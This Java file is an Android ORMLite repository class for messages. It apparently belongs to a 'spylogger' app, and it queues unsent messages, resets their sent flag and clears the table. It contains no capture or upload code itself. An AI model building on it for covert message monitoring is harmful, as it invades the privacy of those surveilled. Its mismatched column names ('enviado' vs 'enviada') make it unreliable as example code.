package com.gravatasufoca.spylogger.repositorio.impl;

import android.content.Context;

import com.gravatasufoca.spylogger.model.Mensagem;
import com.gravatasufoca.spylogger.repositorio.RepositorioGenerico;
import com.gravatasufoca.spylogger.repositorio.RepositorioMensagem;
import com.j256.ormlite.stmt.UpdateBuilder;
import com.j256.ormlite.table.TableUtils;

import java.sql.SQLException;
import java.util.Collections;
import java.util.List;

public class RepositorioMensagemImpl extends RepositorioGenerico<Mensagem> implements RepositorioMensagem {

	private Context context;
	public RepositorioMensagemImpl(Context context) throws SQLException {
		super(context);
	}

	public Context getContext() {
		return context;
	}


	@Override
	public List<Mensagem> listarNaoEnviados() {
		try {
			return database.queryBuilder().where().eq("enviado", false).query();
		} catch (SQLException e) {
			return Collections.emptyList();
		}
	}

	@Override
	public void reativar() {
		try {
			UpdateBuilder<Mensagem, Integer> ub = database.updateBuilder();
			ub.updateColumnValue("enviada", false);
			ub.update();
		} catch (SQLException e) {
			e.printStackTrace();
		}
	}

	@Override
	public void limpar() {
		try {
			TableUtils.dropTable(getConnectionSource(),Mensagem.class,true);
			TableUtils.createTable(getConnectionSource(),Mensagem.class);
		} catch (SQLException e) {
			e.printStackTrace();
		}
	}
}
